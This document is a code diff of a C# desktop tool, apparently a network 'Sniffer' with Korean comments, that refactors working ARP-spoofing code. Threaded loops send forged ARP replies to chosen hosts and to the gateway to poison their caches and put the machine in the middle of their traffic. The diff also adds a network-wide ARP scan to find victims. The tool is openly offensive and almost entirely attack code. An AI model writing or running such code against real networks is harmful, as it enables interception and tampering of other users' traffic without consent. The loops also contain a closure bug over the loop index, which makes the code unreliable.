@@ -18,7 +18,7 @@ namespace Sniffer
 {
     public partial class AttackList : Form
     {
-     
+        BaseInformation baseinformation;
         static Thread[] t_startHostArpSpoofing = new Thread[255];           //공격할 대상을 스푸핑한다.
         static Thread[] t_startGatewayArpSpoofing = new Thread[255];           //공격할 대상을 스푸핑한다.
         
@@ -28,6 +28,7 @@ namespace Sniffer
 
         public AttackList()
         {
+            baseinformation = new BaseInformation();
             InitializeComponent();
             setDataGridView();
         }
@@ -134,40 +135,50 @@ namespace Sniffer
 
         }
 
-        
+        public void startArpSpoofingFunction()
+        {
+            for (int k = 0; k < BaseInformation.attack_IP_list.Count; k++)
+            {
+                if (k == BaseInformation.attack_IP_list.Count) return; //
+                try
+                {
+                    t_startHostArpSpoofing[k] = new Thread(() => startHostArpSpoofing(BaseInformation.attack_IP_list[k], BaseInformation.attack_MAC_list[k]));
+                    t_startHostArpSpoofing[k].Start();
+                    t_startGatewayArpSpoofing[k] = new Thread(() => startGatewayArpSpoofing(BaseInformation.attack_IP_list[k], BaseInformation.attack_MAC_list[k]));
+                    t_startGatewayArpSpoofing[k].Start();
+                }
+                catch (Exception)
+                {
+
+                }
+
+            }
+        }
+
+        private void stopArpSpoofingFunction()
+        {
+            for (int i = 0; i < BaseInformation.attack_IP_list.Count; i++)
+            {
+                t_startHostArpSpoofing[i].Suspend();
+                t_startGatewayArpSpoofing[i].Suspend();
+            }    
+        }
+
         private void btn_select_Click(object sender, EventArgs e)
         { 
             if (threadState == false)
             {
+                startArpSpoofingFunction();
                 threadState = true;
-                for (int i = 0; i < BaseInformation.attack_IP_list.Count; i++)
-                {
-                    if (i == BaseInformation.attack_IP_list.Count) return; //
-                    try
-                    {
-                        t_startHostArpSpoofing[i] = new Thread(() => startHostArpSpoofing(BaseInformation.attack_IP_list[i], BaseInformation.attack_MAC_list[i]));
-                        t_startHostArpSpoofing[i].Start();
-                        t_startGatewayArpSpoofing[i] = new Thread(() => startGatewayArpSpoofing(BaseInformation.attack_IP_list[i], BaseInformation.attack_MAC_list[i]));
-                        t_startGatewayArpSpoofing[i].Start();
-                    }
-                    catch (Exception)
-                    {
-                        
-                    }
-                  
-                }    
                 btn_Start_ArpSpoof.Text = "공격 종료";
             }
             else
             {
-                //t_startArpSpoofing = new Thread(() => startArpSpoofing(AttackIpList, AttackMacList));
-                for (int i = 0; i < BaseInformation.attack_IP_list.Count; i++)
-                {
-                    t_startHostArpSpoofing[i].Suspend();
-                    t_startGatewayArpSpoofing[i].Suspend();
-                }    
-                btn_Start_ArpSpoof.Text = "공격 시작";
+               
+                stopArpSpoofingFunction();
                 threadState = false;
+                btn_Start_ArpSpoof.Text = "공격 시작";
+                
             }
             //
         }
@@ -176,54 +187,59 @@ namespace Sniffer
             while (true)
             {
                 // Millisecond 단위 이며 초기연결 지연설정
-                int readTimeout = 1000;
+
+                int readTimeout = 1;
+
 
                 // 현재 단말기의 네트워크 장치의 리스트들을 불러온다.
 
+
                 // 무선 랜카드의 인덱스 번호는 1번(단말기 설정에 따라 다름)
+
                 ICaptureDevice device = BaseInformation.captureDevice;
 
 
                 // 무선 랜카드를 프러미스큐어스 모드로 연다.
+
                 device.Open(DeviceMode.Promiscuous, readTimeout);
 
+
                 IPAddress targetIP = null;
+
                 IPAddress gatewayIP = null;
+
                 PhysicalAddress targetMac = null;
+
                 PhysicalAddress srcMac = null;
+
                 PhysicalAddress gatewayMac = null;
+
                 targetIP = IPAddress.Parse(targetIpString);
-                targetMac = PhysicalAddress.Parse(targetMacString.ToUpper());
+
+                targetMac = PhysicalAddress.Parse(targetMacString.ToUpper());  // 맥사이사이의 - 문자를 지워준다
+
                 gatewayMac = PhysicalAddress.Parse(BaseInformation.gatewayMac.ToUpper());
 
+
                 gatewayIP = IPAddress.Parse(BaseInformation.gatewayIP); //아이피에 게이트웨이 주소를 넣어주어야 한다.
+
                 srcMac = PhysicalAddress.Parse(BaseInformation.myMacAddress.ToUpper());
 
-                //타겟 Infection
-                
-                 
-                ARPPacket arp = new ARPPacket(ARPOperation.Response, targetMac, targetIP, srcMac, gatewayIP);
-                  
-                
-                EthernetPacket eth = new EthernetPacket(srcMac, targetMac, EthernetPacketType.Arp);
-               
-                eth.PayloadPacket = arp;
-              
-                device.SendPacket(eth);
-                
-                //게이트웨이 Infection
-                    ARPPacket arpForGateway = new ARPPacket(ARPOperation.Response, gatewayMac, gatewayIP, srcMac, targetIP);
-                    EthernetPacket ethforGateway = new EthernetPacket(srcMac, gatewayMac, EthernetPacketType.Arp);
-                    ethforGateway.PayloadPacket = arpForGateway;
-                    device.SendPacket(ethforGateway);
-             
 
-                Thread.Sleep(100);
+                //타겟 Infection
+                ARPPacket arp = new ARPPacket(ARPOperation.Response, targetMac, targetIP, srcMac, gatewayIP);
+                EthernetPacket eth = new EthernetPacket(srcMac, targetMac, EthernetPacketType.Arp);
+                eth.PayloadPacket = arp;
+                device.SendPacket(eth);
+
+                Thread.Sleep(1000);
             }
+            
         }
 
         private void startGatewayArpSpoofing(string targetIpString, string targetMacString)
         {
+
             while (true)
             {
                 // Millisecond 단위 이며 초기연결 지연설정
@@ -258,19 +274,20 @@ namespace Sniffer
                 device.SendPacket(ethforGateway);
 
 
-                Thread.Sleep(100);
+                Thread.Sleep(1000);
             }
         }
 
         private void btn_start_scan_Click(object sender, EventArgs e)
         {
             dataGridView_Host_List.Rows.Clear();
+            baseinformation.sendArpRequest();
             t_startArpScanning = new Thread(() => SearchAllNetwork());
             t_startArpScanning.Start();
         }
         public void sendArpRequest()
         {
-            int readTimeout = 1000;
+            int readTimeout = 1;
 
             // 현재 단말기의 네트워크 장치의 리스트들을 불러온다.
 
